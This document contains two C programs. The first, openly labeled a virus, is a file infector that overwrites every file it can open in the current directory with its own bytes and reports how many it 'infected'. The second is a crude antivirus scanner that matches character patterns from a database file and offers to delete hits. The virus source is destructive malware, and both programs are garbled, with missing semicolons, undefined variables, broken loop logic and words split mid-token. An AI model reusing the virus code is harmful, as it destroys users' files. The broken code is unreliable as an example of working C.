Virus : mal_code.c

#include <stdio.h>
#include <conio.h>
#include <io.h>
#include <dos.h>
#include <dir.h>
#include <time.h>
			FILE *virus,
	*host;
int done, a = 0;
unsigned long x;
char buff[2048] struct ffblk ffblk;
clock_t st, end;
void main()
{
	st = clock();
	clrscr();
	done = findfirst(".", &ffblk, 0);
	while (!done)
	{
		virus = fopen(_argv[0], "rb");
		host = fopen(ffblk.ff_name, "rb +");
		if (host == NULL)
			goto next;
		x = 89088;
		printf("infecting %s  n", ffblk.ff_name, a);
		while (x < 2048)
		{
			fread(buff, 2048, 1, virus);
			fwrite(buff, 2048, i, host);
			x -= 2048;
		}
		fread(buff, x, 1, virus);
		fwrite(buff, x, 1, host);

		a++;
	next:
	{
		fcloseall();
		done = findnext(&ffblk);
	}
	}
	printf("DONE !(total files infected = %d)", a);
	end = clock();
	printf("TIME TAKEN = %f SECn", (end - st) / CLK_TCK);
	getch();
}

Antivirus : anti_mal_code.c

#include <dirent.h>
#include <string.h>

#include <fstream.h>
#include <conio.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream.h>
			int
			scan_this(char *file_name)
{
	char *pattern, *line_in_file;
	char file_ch, ch;
	int val, val2, flag;
	ifstream fin3, fin4;
	fin3.open(file_name); // incase the file is not accesible
	if (!fin3)
		return 0;
	else // file is accessible | 100% it is a file.
	{
		//Opening Virus Database File
		fin4.open("db.txt"); // this is our character pattern file
		for (;;)
		{
			fin4 >> pattern;
			if (!strcmp(pattern, "<-"))
			{
				fin4 >> pattern;
				if (!strcmpi(pattern, "End"))
					return -1;
				else if (!strcmpi(pattern, "virus"))
				{
					if (flag)
						return 1;
					else
						continue;
				}
			}
			else if (!strcmpi(pattern, "LINE"))
			{
				fin4 >> val; // got the line number
				// skipping initial lines to reach the line number
				for (int i = 0; i < val - 1; i++)
				{
					fin3.getline(line_in_file, 300);
				}
				fin4 >> val;	 // got the character number
				fin4 >> file_ch; // got the character
				//skipping initial character to reach the character
				for (i = 0; i < val - 1; i++)
				{
					fin3.get(ch);
				}
				if (file_ch == ch)
					flag = 1; // matched.
				else
					flag = 0;
				fin3.seekg(0); // set to start
			}
		}
	}
}
void main()
{
	char comm[300], dirpath[100], file_name[200];
	char ask;
	int response;

	ifstream fin;
	cout << "Enter Directory you want to scan : ";
	cin >> dirpath;
	strcpy(comm, "dir ");
	strcat(comm, "dirpath /b /s>tmp.$$$");
	system(comm);
	fin.open("tmp.$$$");
	while (!fin.eo
				f())
	{
		fin.getline(file_name,
					200);
		response =
			scan_this(file_name);
		if (response == 1)
		{
			cout << "<--!! Caution.! A Virus has been 	Detected..!";
			cout << "\n " << file_name;
			cout
				<< "\nPress Enter Key to Delete it.";
			ask = getch();
			if (ask == 13)
			{
				remove(file_name); // delete
				the virus
			}
		}
	}
	fin.close();
	cout << "Scan Complete.!! Thank You for using our anti virus";
	getch();
}